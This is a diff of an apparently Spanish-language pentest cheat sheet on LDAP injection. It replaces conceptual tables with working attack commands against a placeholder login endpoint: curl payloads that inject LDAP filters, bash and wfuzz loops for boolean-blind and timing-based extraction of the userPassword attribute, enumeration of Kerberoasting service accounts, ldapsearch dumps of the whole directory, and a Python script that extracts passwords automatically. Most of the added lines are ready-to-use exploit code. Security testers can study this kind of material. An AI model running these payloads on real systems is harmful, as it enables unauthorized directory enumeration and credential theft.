@@ -24,20 +24,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `*` | Match all entries | Universal wildcard. |
-| `a*` | Entries starting con `a` | Prefix enum. |
-| `*z` | Entries ending con `z` | Suffix enum. |
-| `*admin*` | Entries containing `admin` | Substring enum. |
-| `(uid=*)` | All UIDs | Direct enum. |
-| `(objectClass=*)` | All objects of any class | Universal. |
-| `(objectClass=user)` | Solo users (AD) | Class filter. |
-| `(objectClass=person)` | Solo persons | Same. |
-| `(objectClass=group)` | Solo groups | AD groups. |
-| `(memberOf=CN=Admins,...)` | All admins | Group enum. |
-| `(&(objectClass=user)(samAccountName=admin*))` | Users con SAM starting `admin` | AD compound. |
-| Wildcard en `mail` | `(mail=*@target.com)` | Domain enum. |
-| Wildcard en `userPassword` | `(userPassword=*)` | Users con pass set (AD doesn't expose hash but OpenLDAP can). |
-| Pagination | LDAP server can return paged | If atacante reads multiple pages. |
+| `curl -d "username=*&password=any" https://target/login` | Match all entries | Filter `(uid={u})` simple. |
+| `curl -d "username=a*&password=any" https://target/login` | Entries starting con `a` (prefix enum) | Char-by-char prefix. |
+| `curl -d "username=*admin*&password=any" https://target/login` | Entries containing `admin` | Substring enumeration. |
+| `curl -d "username=*)(objectClass=user)&password=any" https://target/login` | Solo objects de tipo user (AD) | objectClass filter inject. |
+| `curl -d "username=*)(memberOf=CN=Admins,DC=target,DC=com)&password=any" https://target/login` | Lista miembros del grupo Admins | Group enumeration. |
+| `curl --data-urlencode "username=*)(mail=*@target.com)&password=any" https://target/login` | Users con email del dominio | Email-based discovery. |
+| `curl -d "username=*)(userPassword=*)&password=any" https://target/login` | Users con userPassword set | OpenLDAP solo (AD no expone). |
+| `curl -d "username=*)(servicePrincipalName=*)&password=any" https://target/login` | Service accounts (Kerberoasting targets) | AD SPN enum. |
+| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=*)" "*"` | Full directory dump si anonymous bind | Direct LDAP server access. |
+| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)" sAMAccountName mail memberOf` | AD users con attributes específicos | Enumeration AD. |
 ^ldap-disclosure-wildcards
 
 ___
@@ -46,18 +42,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Use OR filter para inferir char-by-char | Standard blind technique. |
-| Test single char | `*)(uid=admin*` matches → admin existe? | Existence check. |
-| Substring test | `*)(uid=a*` returns user? | First char = `a`. |
-| Iterate chars | Loop `a-z 0-9 -` per position | Char enum. |
-| Boolean indicator | Login success vs login failure | Difference observable. |
-| Status code differential | 200 vs 401 vs 500 | Standard oracle. |
-| Response length differential | Match vs no-match has different size | Sometimes more reliable. |
-| Time differential | Match takes longer (or vice versa) | If load. |
-| Char-by-char password attribute | `*)(userPassword=a*)` | If userPassword leakable. |
-| `objectClass` enum | `*)(objectClass=a*)` | Schema discovery. |
-| Group enumeration | `*)(memberOf=CN=a*)` | DN inference. |
-| OID extraction | `*)(supportedControl=1.2.840.*` | Server feature flags. |
+| `curl -d "username=admin)(userPassword=a*)&password=x" https://target/login` | True/false oracle char inicial password | OpenLDAP con userPassword leakable. |
+| `for c in {a..z} {0..9}; do curl -s -d "username=admin)(userPassword=${c}*)&password=x" https://target/login \| grep -q "Welcome" && echo "$c match"; done` | Loop char-by-char primer char | Boolean blind extraction. |
+| `curl -d "username=admin)(memberOf=CN=Domain Admins*)&password=x" https://target/login` | Confirma si admin pertenece a Domain Admins | Group membership oracle. |
+| `curl -d "username=admin)(supportedControl=1.2.840.*)&password=x" https://target/login` | Server feature flags via OID | Server fingerprinting blind. |
+| `wfuzz -d "username=admin)(userPassword=FUZZ*)&password=x" -w chars.txt --hh 1234 https://target/login` | Bulk char enum con wfuzz | Filter response by length. |
+| `python3 ldap-blind.py --url https://target/login --user admin --attr userPassword` (custom script) | Auto extraction script | Pattern reusable. |
 ^ldap-disclosure-boolean
 
 ### Script Python boolean extraction
@@ -66,16 +56,16 @@ ___
 import requests, string
 
 URL = "https://target/login"
-TARGET = "userPassword"
-chars = string.ascii_lowercase + string.digits + "-_"
+ATTR = "userPassword"
+chars = string.ascii_lowercase + string.digits + "-_!@#"
 
 result = ""
 while True:
     found = False
     for c in chars:
-        payload = f"admin)({TARGET}={result}{c}*"
+        payload = f"admin)({ATTR}={result}{c}*"
         r = requests.post(URL, data={"username": payload, "password": "x"})
-        if "Welcome" in r.text:  # success indicator
+        if "Welcome" in r.text:  # success indicator (ajustar según app)
             result += c
             print(f"[+] {result}")
             found = True
@@ -92,16 +82,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Heavy filter expression delays response | Inferir char por timing. |
-| Heavy expression | `(\|(cn=a)(cn=b)(cn=c)(cn=d)...(cn=z))` | Multi-OR para slowdown artificial. |
-| Conditional heavy | If char match, run heavy filter | Standard time oracle. |
-| LDAP server resource exhaustion | Long filters cause CPU usage | Sometimes 500 ms+ diff. |
-| Pagination loop | Force pagination to enumerate | Natural delay. |
-| Substring loop | Long substring extraction in single filter | Triggers expensive ops. |
-| Wildcard subtree search | `(*=*)` con large subtree | Server scans all. |
-| `objectClass=*` con base DN broad | Returns thousands → time-consuming | Network-bound delay. |
-| Combine con sleep gadget en app | Backend uses LDAP filter to check + sleep on success | Indirect timing. |
-| Real-time monitoring | Atacante monitorea response time per char | Statistical analysis. |
+| `time curl -s -d "username=admin)(\|(cn=a)(cn=b)(cn=c)...(cn=z))&password=x" https://target/login` | Heavy filter → mide latencia | Server lento bajo load. |
+| `time curl -s -d "username=*)(uid=*)(\|(cn=a)(cn=b)(cn=c)...)&password=x" https://target/login` | Comparar timing match vs no-match | Timing oracle. |
+| `python3 -c "import requests,time; t=time.time(); r=requests.post('https://target/login', data={'username':'admin)(userPassword=a*)','password':'x'}); print(time.time()-t)"` | Mide tiempo respuesta single char | Stat analysis per-char. |
+| `for c in {a..z}; do T=$(curl -o /dev/null -s -w '%{time_total}' -d "username=admin)(userPassword=${c}*)&password=x" https://target/login); echo "$c: $T"; done` | Loop timing extraction | Bash one-liner blind extraction. |
+| `wfuzz --slice "FUZZ ~ <0.5 OR > 1.0" -d "username=admin)(userPassword=FUZZ*)&password=x" -w chars.txt https://target/login` | Filter por timing | wfuzz time-based. |
 ^ldap-disclosure-time
 
 ___
@@ -110,20 +95,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Error message contains LDAP filter or attribute value | Direct disclosure. |
-| Force syntax error | `*)(invalid` | Filter syntax error reveals partial. |
-| Type mismatch error | `(uid=NOT_A_NUMBER)` con int field | Sometimes error includes value. |
-| Schema violation | Add unknown attribute | Error reveals schema info. |
-| DN parse error | Malformed DN | Reveals base DN. |
-| Authentication error verbose | "User not found" vs "Wrong password" | Username enumeration. |
-| Search result error | Search retrieves data → error includes data | Edge case. |
-| Stack trace en error page | Java/PHP/.NET stack trace con LDAP context | Disclosure. |
-| Debug mode app | Verbose logs include filter execution | Dev mode. |
-| LDAP referral error | Referral to other server reveals topology | Multi-DC. |
-| `objectClass` enumeration via error | Iterating classes triggers different errors | Schema enum. |
+| `curl -d "username=*)(invalid&password=x" https://target/login` | Force LDAP syntax error | Stack trace o error verbose revela info. |
+| `curl -d "username=NOT_A_NUMBER&password=x" https://target/login` | Type mismatch error | Field con int constraint. |
+| `curl -d "username=cn=fake,DC=invalid&password=x" https://target/login` | DN parse error revela base DN del server | Malformed DN trigger. |
+| `curl -d "username=admin&password=" https://target/login` y comparar con `curl -d "username=fakeuser&password="` | "User not found" vs "Wrong password" → username enumeration | Verbose error differential. |
+| `curl -d "username=admin)(unknownAttr=test)&password=x" https://target/login` | Schema violation error revela attrs válidas | Schema enumeration. |
+| `curl -s -d "username=*&password=x" https://target/login \| grep -oE "DC=[a-zA-Z=,]+\|CN=[^,]+\|[a-zA-Z]+Exception"` | Extraer base DN + class names del error | Post-error parsing. |
 ^ldap-disclosure-error
 
-### Common error patterns reveals info
+### Common error patterns
 
 ```
 LDAPException: [LDAP: error code 32 - 0000208D: NameErr: DSID-031001E5,
@@ -131,14 +111,12 @@ problem 2001 (NO_OBJECT), data 0, best match of:
   'DC=target,DC=com'
 ]
                                                               ↑
-                                                              Reveals base DN
-```
+                                                       Reveals base DN
 
-```
 javax.naming.directory.InvalidSearchFilterException: 
 Bad search filter at character: 12: (&(uid=*)(uid=*)
                                                 ↑
-                                                Reveals filter structure
+                                              Reveals filter
 ```
 
 ***
